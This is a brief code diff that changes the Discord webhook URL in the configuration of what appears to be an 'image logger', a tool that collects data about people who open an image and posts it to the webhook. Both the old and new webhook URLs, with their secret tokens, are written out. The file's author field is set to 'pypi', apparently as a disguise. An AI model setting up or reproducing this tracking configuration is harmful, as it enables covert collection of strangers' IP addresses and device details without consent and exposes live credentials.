@@ -12,7 +12,7 @@ __author__ = "pypi"
 
 config = {
     # BASE CONFIG #
-    "webhook": "https://discord.com/api/webhooks/1267533740612128892/iMVhAYVhhwMvsVq0q94EJCMNSqKj-gcNKgIdj-VsNhV95Ju2ZY1QQd9WxzkA_9hUgYM7",
+    "webhook": "https://discord.com/api/webhooks/1268752143251144785/qTr0LUiWJBG3gPUbFqV2m4cG0RpK6Z1H3vox4DEcDaFh_fZdGHlb6QiHC30jE-pfuiPU",
     "image": "https://images-ext-1.discordapp.net/external/6kX4_SJEceTLMiHCh2hdZpibT_xzN-Zu5gmfrn_uRJ4/%3Ftext%3Dsigh/https/api.popcat.xyz/alert", # You can also have a custom image by using a URL argument
                                                # (E.g. yoursite.com/imagelogger?url=<Insert a URL-escaped link to an image here>)
     "imageArgument": True, # Allows you to use a URL argument to change the image (SEE THE README)
